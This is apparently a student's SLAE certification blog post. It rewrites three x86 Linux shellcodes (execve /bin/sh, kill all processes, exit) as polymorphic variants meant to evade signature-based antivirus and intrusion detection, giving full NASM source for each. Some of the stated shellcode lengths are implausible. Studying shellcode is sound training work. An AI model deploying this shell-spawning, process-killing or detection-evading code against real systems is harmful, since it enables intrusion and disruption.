The 6th assignment for the SLAE certification, is to take 3 samples from the [shell-storm](http://shell-storm.org/shellcode/) database, and create polymorphic shellcodes of them. The shellcode on it's own directly from the webiste will more than likely get detected by any AV or HIDS device, that's where this assignment comes in. If we were to change the way that the shellcode operates, but keep it's core function, we can try and bypass any of those signature based detectors.

Let's jump into the samples!


x86 Linux execve(/bin/sh)
-------------------------

Let's take a look at the original shellcode.

- Shellcode Length:  28


```nasm
global _start

section .text

_start:

	xor eax, eax
	push eax
	push 0x68732f2f
	push 0x6e69622f
	mov ebx, esp
	mov ecx, eax
	mov edx, eax
	mov al, 0xb
	int 0x80
	xor eax, eax
	inc eax
	int 0x80
```

Pretty simple shellcode, so I will not go into too much detail on how it works. Plenty of stuff we have seen before, pushing `dword`'s onto the stack for `/bin//sh', setting the `syscall` value. This shellcode, weirdly, zeroes out the other main registers without really using them. This may be some sort of obfuscation to hide the real operations within the noise, but for our polymorphic shellcode, we will not be doing that.

Let's see the updated, polymorphic shellcode.

- Shellcode Length:  23

```nasm
; Author: Anubis
; SLAE

global _start

section .text

_start:

	xor ebx, ebx ; Used ebx instead of eax
	push ebx
	push 0x68732f2f
	push 0x6e69622f
	mov ebx, esp ; After this line, no need to zero out any othe registers
	mov al, 11 ; Ascii number instead of hex
	int 0x80
	mov al, 1
	int 0x80
```

We can go through some of the major points, but the comments speak for themselves for the most part.

We used `EBX` instead of `EAX`, pushed the same `dword`'s, got rid of the `XOR`'s that weren't necessary, and used the decimal value for the `syscall` rather than the hex.



Kill All Processes
------------------

This was a really fun shellcode to play with. It does just as it says and makes everything stop and brings you back to the log in screen. I have to say, I was impressed by how Ubuntu handled this kind of kill spree!

Let's take a look at the original shellcode.


- Shellcode Length:  11


```nasm
global _start

section .text

_start:

	push 37
	pop eax
	push byte -1
	pop ebx
	push byte 9
	pop ecx
	int 0x80
```

This is a really simple shellcode (another reason why I enjoyed re-writing it) that doesn't require a lot. It puts the `syscall` value onto the stack, puts it into `EAX`; puts `-1` onto the stack and puts it into `EBX`; then puts `9` onto the stack and then puts it into `ECX`. 

Let's now take a look at how I changed this up a bit.


Shellcode Length:  3

```nasm
global _start

section .text

_start:

	mov al, 37 ; Load syscall straight into al
	mov ebx, 0 ; Set EBX to 0
	sub ebx, 1 ; Make EBX -1
	mov ecx, 9 
	int 0x80
```

So the first thing that might stick out is the shellcode length. It says `3`. The shellcode does contain some nulls in it, which I thought would pose an issue, but after putting the shellcode into the binary and executing it, it worked just as it did with the original! It did take a few seconds longer to actually kill everything, so that is one drawback and could be refined if I had more time...


Anyway, let's get into the explanation. We first but the `syscall` value straight into `al`, rather than putting onto the stack and then `POP`ing it into `EAX`. Then we set `EBX` to `0`, and the do the `sub` command to `EBX` in order to get the value of `-1`. Then, just load `9` straight into `ECX`. 

And this executes with all the hilarity of the original! Onto the last sample.


Exit Shellcode
--------------

I thought this would be an interesting one to tackle since it doesn't have any malicous effects and is pretty simple. Let's start by looking at the original shellcode.


- Shellcode Length:  3

```nasm
global _start

section .text

_start:

	inc eax
	mov ebx, 23
	int 0x80
```


Very very simple stuff. Just loads `1` into `EAX` and then an arbitrary number into `EBX`. This arbitrary number will be what the exit value returns. Let's quickly run this binary to see how it works.


```sh
anubis@slae:~/SLAE/Assignment_6/exit_shellcode$ ./exit
anubis@slae:~/SLAE/Assignment_6/exit_shellcode$ echo $?
23
anubis@slae:~/SLAE/Assignment_6/exit_shellcode$
```

As you can see, it runs with no output but, examining the return value shows that `23` was loaded and returned.

Let's see how we can change this. Here is the updated shellcode.

- Shellcode Length:  2

```nasm
global _start

section .text

_start:

	mov eax, 222 ; Random number into EAX
	push 222 ; Random number onto stack
	sub eax, 220 ; Make EAX 2
	pop ebx ; Put random number from stack to EBX
	sub eax, 1 ; Make EAX 1
	int 0x80 ; Execute
```

So for this one, due to it's simplicity, I had to get a bit creative.

I first loaded a random number into `EAX`. Then I put the same random number onto the stack. Following that, I subtracted `220` from `222` to make `EAX` equal `2`. Then I took the `222` from the stack and put it into `EBX`. Then subtracting `1` from `EAX` then creates the syscall value for `exit`. When we execute this, it should return the value `222`. Let's see this in action.

```sh
anubis@slae:~/SLAE/Assignment_6/exit_shellcode$ ./exit_new 
anubis@slae:~/SLAE/Assignment_6/exit_shellcode$ echo $?
222
anubis@slae:~/SLAE/Assignment_6/exit_shellcode$
```

Perfect! It works! And we have created a lot of hoops to make any detection a bit harder.


And that is all of them. The next post will be the last one for the SLAE! See you then!


<hr />

This blog post was created as per the requirements of the Security Tube Linux Assembly Expert certification.

Student ID: SLAE-1406

Please see [https://github.com/AnubisSec/SLAE](https://github.com/AnubisSec/SLAE) for all the source files mentioned on this site.
